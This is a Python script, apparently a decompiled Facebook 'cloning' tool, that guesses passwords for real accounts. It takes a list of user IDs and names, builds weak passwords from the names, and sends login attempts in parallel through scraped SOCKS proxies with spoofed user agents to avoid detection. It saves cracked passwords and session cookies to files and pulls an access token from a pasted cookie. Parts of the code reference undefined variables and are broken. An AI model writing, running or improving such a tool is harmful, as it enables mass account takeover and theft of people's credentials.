# MOTHERFUCKER RR-KIDS
# YOUR FATHER MR. NIKI OK
# NEXT NO ABLAMI 
# OPEN CODE UPLOAD BY MR. NIKI


import requests, bs4, json, os, sys, random, datetime, time, re, urllib3, rich, base64, uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON = sol()
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []

try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt', 'w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;97mMR-JAHID]')

prox = open('.prox.txt', 'r').read().splitlines()

for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f"{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}"
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = ['6', '7', '8', '9', '10', '11', '12']
    c = ' en-us; GT-'
    d = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    e = random.randrange(1, 999)
    f = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
    ugen.append(uaku2)

for x in range(10):
    a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b = random.randrange(100, 9999)
    c = random.randrange(100, 9999)
    d = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    e = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    f = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    g = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    h = random.randrange(1, 9)
    i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak = f"{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}"

def uaku():
	try:
		ua = open('bbnew.txt', 'r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a = requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua = open('.bbnew.txt', 'w')
		aa = re.findall('line">(.*?)<', str(a))
		for un in aa:
			ua.write(un + '\n')
		ua = open('.bbnew.txt', 'r').read().splitlines()

(id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []
pwpluss = []
pwnya = []
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
asu = random.choice([m, k, h, u, b])
dic = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July', '08': 'August', '09': 'September', '10': 'October', '11': 'November', '12': 'Devember'}
dic2 = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July', '08': 'August', '09': 'September', '10': 'October', '11': 'November', '12': 'Devember'}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now()
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
	
def alvino_xy(u):
	for e in u + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.005)

def clear():
	os.system('clear')

def back():
	Main()

def banner():
	print('\x1b[1;92m\n	 \t\x1b[1;91m██████╗░██╗██╗░░░██╗░█████╗░██████╗░\n	 \t\x1b[1;90m██╔══██╗██║╚██╗░██╔╝██╔══██╗██╔══██╗\n	 \t\x1b[1;93m██████╔╝██║░╚████╔╝░███████║██║░░██║\n	 \t\x1b[1;94m██╔══██╗██║░░╚██╔╝░░██╔══██║██║░░██║\n	 \t\x1b[1;97m██║░░██║██║░░░██║░░░██║░░██║██████╔╝\n	 \t\x1b[1;92m╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░\n\n ┌──────────────────────────────────────────────────────┐\n │[✓] DEVOLPER   :			ABUBOCKOR RIYAD [RR]	  │\n │[✓] WHATSAPP   :			+8801710375092			│\n │[✓] GITHUB	 :			RR-HACKER-RIYAD		   │\n │[✓] TOOLS	  :			RRK-FILE-CLONING		  │\n │[✓] TEAM	   :			RRK					   │\n └──────────────────────────────────────────────────────┘\n	\n	\t \x1b[47m\x1b[1;31mTHE TOOL WILL BE UPDATED EVERY SEVEN DAYS\x1b[40m\x1b[00m\n		   ')

def login1():
	try:
		token = open('.token.txt', 'r').read()
		cok = open('.cok.txt', 'r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], cookies={'cookie': cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2, sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='purple')
			exit()
	except IOError:
		login_lagi334()

def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t			 WELLCOME : [green]ENJOY PUBLIK TOOL[purple] '))
		asu = random.choice([m, k, h, b, u])
		cookie = input(f"  [{h}•{u}] INPUT COOKIES :{asu} ")
		data = requests.get('https://business.facebook.com/business_locations', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 9; XIAOMI Mi Note 10 Pro Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.15.0', 'referer': 'https://www.facebook.com/', 'host': 'business.facebook.com', 'origin': 'https://business.facebook.com', 'upgrade-insecure-requests': '1', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8','content-type': 'text/html; charset=utf-8' }, cookies={'cookie': cookie})
		find_token = re.search('(EAAG\\w+)', data.text)
		ken = open('.token.txt', 'w').write(find_token.group(1))
		cok = open('.cok.txt', 'w').write(cookie)
		print(f"  {u}[{h}•{u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ")
		time.sleep(1)
		exit()
	except Exception as e:
		os.system('rm -f .token.txt')
		os.system('rm -f .cok.txt')
		print('  %s[%sx%s]%s LOGIN ERROR....TRY AGAIN !!%s' % (x, k, x, m, x))
		exit()

def notice():
	print('\n\x1b[0;91mYOU ARE NOT PREMIUM USER ')
	print('\n\x1b[0;91mPLEASE BUY RR_GREEN TOOL ')
	print('\x1b[0;93mSENT THIS KEY TO ADMIN >> %s%s' % (G, basesplit))
	print('\x1b[0;92mADMIN WHATSAPP\x1aRR_RIYAD')
	time.sleep(2)
	os.system('am start https://wa.me/+8801710375092')

def irfan():
	runtxt('\n\x1b[0;91m This tool is Under maintenance break ')
	runtxt('\n\x1b[0;91m So wait For Update ')

plist = platform.uname()[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = basex3.upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')
	
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Riyad-RR-Hacker/text/main/Dis').text
			if basesplit in plr:
				key = basesplit
				stat = '\x1b[0;92mPAID'
				FY = '\x1b[0;93m'
				FG = '\x1b[0;92m'
				GET = '\r'
			else:
				key = basesplit
				stat = '\x1b[0;91mNOT PAID'
				FY = '\x1b[0;90m'
				FG = '\x1b[0;90m'
				GET = '\x1b[0;92m [P] GET PREMIUM'
		except requests.exceptions.ConnectionError:
			print('\n%s [!] NO INTERNET CONNECTION..\n' % G)
			exit()
		os.system('clear')
		banner()
		print('')
		print('%s [%s✓%s] %sVERSION   : %s6.0' % (G, R, G, G, G))
		print('%s [%s✓%s] %sYOUR KEY  : %s%s' % (G, R, G, G, G, key))
		print('%s [%s✓%s] %sSTATUS	: %s' % (G, R, G, G, stat))
		print('\x1b[1;92m\n ┌───────────────────────┐\n │\x1b[92;1m[1] CRACK FROM FILE	│\n └───────────────────────┘')
		print('\x1b[1;92m\n ┌───────────────────────┐\n │\x1b[92;1m[2] CONTACT WITH ADMIN │\n └───────────────────────┘')
		print('\x1b[1;92m\n ┌───────────────────────┐\n │\x1b[92;1m[3] EXIT TOOL		  │\n └───────────────────────┘')
		_____cowok__pink_____ = input('\n CHOOSE : ')
		if _____cowok__pink_____ in ('1',):
			if basesplit in plr:
				fileclone()
			elif basesplit in ('2',):
				os.system('am start https://wa.me/+8801710375092')
			elif basesplit in ('3',):
				print('=>EXIT DONE ')
				exit()
			else:
				print('=>CHOOSE RIGHT MNEU ')
				Main()

def error():
	print(f"{k}=>TRY AGAIN {u}")
	time.sleep(4)
	back()

def fileclone():
	os.system('clear')
	__crack__().plerr()

class __crack__:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system('clear')
		banner()
		try:
			fileX = input('\x1b[1;92m\n [+] Enter file path : ')
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print('\x1b[1;92m [+] TOTAL ID : ' + str(len(id)))
			time.sleep(3)
			setting()
		except IOError:
			print('\x1b[1;91m\n [!] file %s not found\x1b[0m' % fileX)
			time.sleep(2)
			fileclone()

def setting():
	os.system('clear')
	banner()
	print('')
	cetak(nel('[bold green]➣1. CLONE JUST OLD IDZ \n➣2. CLONE JUST NEW IDZ=>RECOMEND \n➣3. CLONE MIX IDZ (NEW/OLD)=>RECOMEND [bold green]'))
	print('')
	hu = input('=>CHOOSE : ')
	if hu in ('1', '01'):
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ('2', '02'):
		muda = []
		for bacot in sorted(id):
			muda.append(bacot)
		bcm = len(muda)
		bcmi = bcm - 1
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -= 1
	elif hu in ('3', '03'):
		for bacot in id:
			xx = random.randint(0, len(id2))
			id2.insert(xx, bacot)
	else:
		print('=>TRY AGAIN')
		exit()
	os.system('clear')
	banner()
	print('')
	cetak(nel('[bold green]➣1. MOBILE \x1b[1;91m[SLOW]\n➣2. MBASIC \x1b[1;92m[VERY FIRST]\n➣3. TOUCH \x1b[1;91m [SLOW]\n➣4. MTOUCH \x1b[1;91m[SLOW] [bold green]'))
	print('')
	hc = input('>> CHOOSE : ')
	if hc in ('1', '01'):
		method.append('mobile')
	elif hc in ('2', '02'):
		method.append('mobile')
	elif hc in ('3', '03'):
		method.append('mobile')
	elif hc in ('4', '04'):
		method.append('mbasic')
	else:
		method.append('mobile')
	os.system('clear')
	banner()
	print('')
	_jembot_ = input('\x1b[1;92m=>SHOW APKS ( Y/t ) ')
	pwplus = input('=>\x1b[1;92mPASWORD MENU MENUAL(CHOISE)/DEFULT(AUTO)( M/D ) ')
	if pwplus in ('y', 'Y'):
		pwpluss.append('ya')
		cetak(nel('[[purple]•[yellow]] ADD PASWORD MXM 6 WORDS\n[[purple]•[yellow]] EXIMPLE :[green] 556677,786786,123456[purple] '))
		pwku = input('#=>Add PASSWORDS : ')
		pwkuh = pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit()

def complete():
	print('')
	print('%s══════════════════════════════════════════' % N)
	print('\x1b[1;92mSCANNING COMPLETE')
	print('\x1b[1;92m💚TOTAL ID : ' + str(len(id)))
	print('\x1b[1;92m💚TOTAL OK : ' + str(ok))
	print('\x1b[1;91m❤️TOTAL CP : ' + str(cp))
	print('%s══════════════════════════════════════════' % N)

def passwrd():
	os.system('clear')
	banner()
	print('\x1b[1;92m══════════════════════════════════════════')
	print('👉\x1b[1;92mYOUR CLONEING STARTED')
	print('👉\x1b[1;92mTOTAL IDZ : ' + str(len(id)))
	print('👉\x1b[1;92mYOUR OK ID SAVED: rr_ok.txt')
	print('👉\x1b[1;91mYOUR CP ID SAVED: rr_cp.txt')
	print('👉\x1b[1;92mYOUR CLONING STOP PRESS CTRL THAN Z')
	print('\x1b[1;92m══════════════════════════════════════════')
	print('')
	with tred(30, **('max_workers',)) as pool:
		for yuzong in id2:
			idf = yuzong.split('|')[0]
			nmf = yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf) < 6:
				if len(frs) < 3:
					pass
				else:
					pwv.append(frs + '123')
					pwv.append(frs + '1234')
					pwv.append(frs + '12345')
					pwv.append(frs + '1122')
			elif len(frs) < 3:
				pwv.append(nmf)
			else:
				pwv.append(nmf)
				pwv.append(frs + '123')
				pwv.append(frs + '1234')
				pwv.append(frs + '12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			if 'mobile' in method:
				pool.submit(crack, idf, pwv)
			elif 'free' in method:
				pool.submit(crack, idf, pwv)
			elif 'touch' in method:
				pool.submit(crack, idf, pwv)
			elif 'mbasic' in method:
				pool.submit(crack, idf, pwv)
			else:
				pool.submit(crack, idf, pwv)
	print('')
	complete()

def crack(idf, pwv):
	global cp, ok, loop
	bo = random.choice([m, k, h, b, u, x])
	(sys.stdout.write(f"\r{b}RR_CRACK{P} [{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),)
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip = random.choice(prox)
			proxs = {'http': 'socks4://' + nip}
			ses.headers.update({'Host': 'm.facebook.com','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/','accept-encoding': 'gzip, deflate br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),'uid': idf,'next': 'https://p.facebook.com/login/save-device/','flow': 'login_no_pin','pass': pw}
			koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
			koki += ' m_pixel_ratio=2.625; wd=412x756'
			heade = {'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
			if 'checkpoint' in po.cookies.get_dict().keys():
				print('')
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mRR_CP🥀')
				print(f"\x1b[1;91m[✓] USER ID	   : {idf}\n\x1b[1;91m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				print(f"\r{ua}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				print('')
				open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
				open('RR_CP.txt', 'a').write(idf + '|' + pw + '\n')
				akun.append(idf + '|' + pw)
				cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				ok += 1
				coki = po.cookies.get_dict()
				kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('')
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mRR_OK💚')
				print(f"\x1b[1;92m[✓] USER ID	   : {idf}\n\x1b[1;92m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER COOKIES: ')
				print(f"\r{kuki}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				print(f"\r{ua}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				open('RR_Ok.txt', 'a').write(idf + '|' + pw + '|' + ua + '\n')
				open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + ua + '\n')
				cek_apk(session, coki)
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		loop += 1
def crackfree(idf, pwv):
	global cp, ok, loop
	(sys.stdout.write(f"\r{b}RR_CRACK{P} [{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),)
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'p.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','sec-fetch-dest': 'document','referer': 'https://p.facebook.com/','accept-encoding': 'gzip, deflate br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),'uid': idf,'next': 'https://p.facebook.com/login/save-device/','flow': 'login_no_pin','pass': pw}
			koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
			koki += ' m_pixel_ratio=2.625; wd=412x756'
			heade = {'Host': 'p.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://p.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
			if 'checkpoint' in po.cookies.get_dict().keys():
				print('')
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mRR_CP🥀')
				print(f"\x1b[1;91m[✓] USER ID	   : {idf}\n\x1b[1;91m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				print(f"\r{ua}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				print('')
				open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
				open('RR_CP.txt', 'a').write(idf + '|' + pw + '\n')
				akun.append(idf + '|' + pw)
				cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				ok += 1
				coki = po.cookies.get_dict()
				kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('')
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mRR_OK💚')
				print(f"\x1b[1;92m[✓] USER ID	   : {idf}\n\x1b[1;92m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER COOKIES: ')
				print(f"\r{kuki}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				print(f"\r{ua}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				open('RR_OK.txt', 'a').write(idf + '|' + pw + kuki + '\n')
				open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
				cek_apk(session, coki)
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		loop += 1

def cracktouch(idf, pwv):
	global cp, ok, loop
	bi = random.choice([u, k, kk, b, h, hh])
	pers = loop * 100 / len(id2)
	fff = '%'
	nip = random.choice(prox)
	proxs = {'http': 'socks5://' + nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x))
	sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/','accept-encoding': 'gzip, deflate br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), 'uid': idf, 'next': 'https://p.facebook.com/login/save-device/', 'flow': 'login_no_pin', 'pass': pw}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr','accept-encoding': 'gzip, deflate br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
			koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
			koki += ' m_pixel_ratio=2.625; wd=412x756'
			if 'checkpoint' in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf + '|' + pw)
					ceker(idf, pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'''[•] ID	   : {idf} [•] PASSWORD : {pw}'''
					statuscp1 = nel(statuscp, 'red', **('style',))
					cetak(nel(statuscp1, 'RR CP', **('title',)))
					open('RR_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				headapp = {
					'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]' }
				if 'no' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('/sdcard/JAHID-KING/OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					print('\n')
					statusok = f'''[•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, 'NAYIM-KING  OK', **('title',)))
					ok += 1
				elif 'ya' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('RR_OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					user = idf
					infoakun = ''
					session = requests.Session()
					cek2 = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', coki, headapp, **('cookies', 'headers')).text
					cek = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', coki, headapp, **('cookies', 'headers')).text
					infoakun += '\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n'
					apkaktif = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek))
					nok = 1
					for muncul in apkaktif:
						infoakun += f'''[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n'''
						nok += 1
					hit = 0
					infoakun += '\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n'
					apkexp = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek2))
					hit = 0
					for muncul in apkexp:
						hit += 1
